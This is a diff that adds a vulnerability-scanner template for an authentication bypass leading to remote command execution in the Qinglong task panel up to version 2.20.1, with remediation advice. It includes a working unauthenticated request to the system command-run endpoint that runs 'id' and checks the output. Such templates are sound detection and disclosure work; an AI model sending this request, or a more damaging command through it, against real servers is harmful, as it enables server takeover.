@@ -1,0 +1,50 @@
+id: qinglong-auth-bypass-rce
+
+info:
+  name: Qinglong 2.20.1 - Authentication Bypass to RCE via System Command Run
+  author: qwtd
+  severity: critical
+  description: |
+    Qinglong <= 2.20.1 存在鉴权绕过利用链，攻击者可在未授权情况下通过开放接口完成初始化/重置管理员凭据并获取有效 Token，
+    随后调用系统命令执行接口触发远程代码执行（RCE），可导致服务器被完全接管。
+  remediation: |
+    立即升级到官方修复版本（如已发布），或在升级前采取临时缓解措施：
+    1) 禁止将 Qinglong 面板暴露到公网（仅内网访问）；2) 在网关/WAF 层封禁 /open/* 等不必要开放路径；
+    3) 配置强随机的 JWT_SECRET 等关键安全配置并重启服务；4) 审计并移除可疑任务/脚本与配置变更。
+  impact: |
+    未授权攻击者可获得管理权限并执行任意系统命令，进而读取/篡改数据、投放后门、横向移动或部署挖矿等恶意程序。
+  reference:
+    - https://mrxn.net/jswz/qinglong-auth-bypass-rce.html
+    - https://qinglong.online/api/system
+    - https://linux.do/t/topic/1664395
+    - https://cn-sec.com/archives/5048547.html
+    - https://github.com/whyour/qinglong/issues/2934
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-306
+  metadata:
+    vendor: whyour
+    product: qinglong
+    verified: true
+    max-request: 1
+  tags: 青龙-定时任务管理面板
+
+http:
+  - raw:
+      - |
+        PUT /aPi/system/command-run HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"command": "id"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - 'uid=\d+\(([^)]+)\) gid=\d+\(([^)]+)\)'
